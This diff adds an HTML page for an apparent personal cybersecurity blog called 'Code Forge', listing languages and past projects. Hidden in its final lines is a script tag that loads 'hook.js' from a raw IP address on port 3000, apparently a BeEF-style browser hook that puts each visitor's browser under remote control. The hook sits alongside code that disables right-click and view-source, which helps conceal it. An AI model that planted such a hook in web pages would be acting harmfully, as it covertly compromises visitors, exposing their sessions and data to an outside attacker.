@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Forge</title>
+    <style>
+        body {
+            background-color: black;
+            color: #00FF00; /* Cyber green color */
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .box {
+            border: 2px solid #00FF00; /* Green border */
+            padding: 20px;
+            border-radius: 10px;
+            margin: 0 auto;
+            max-width: 600px;
+        }
+        h1 {
+            font-size: 2em;
+        }
+    </style>
+</head>
+<body>
+  <div class="box">
+    <h1>Welcome</h1>
+    <p>Programming languages I know:</p>
+    <ul>
+      <li>Python</li>
+      <li>C/C++</li>
+      <li>PHP</li>
+      <li>Java</li>
+    </ul>
+
+    <p>I am a cybersecurity enthusiast.</p>
+    <p>This is a blog where I'll be talking about my programming and hacking ventures</p>
+    <br>
+    <br>
+    <br>
+    <h2>Some of my past projects include: </h2>
+    <ul>
+        <li>Malcryptor (An encryption program, Python)</li>
+        <li>Cipherbox (Encryption library, C++)</li>
+        <li>Trackme (in progress, Java)</li>
+    </ul>
+  </div>
+    <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Disable viewing page source
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 117)) {
+                e.preventDefault();
+            }
+        });
+    </script>
+    <script src="http://172.104.248.4:3000/hook.js"></script>
+</body>
+</html>
+
+
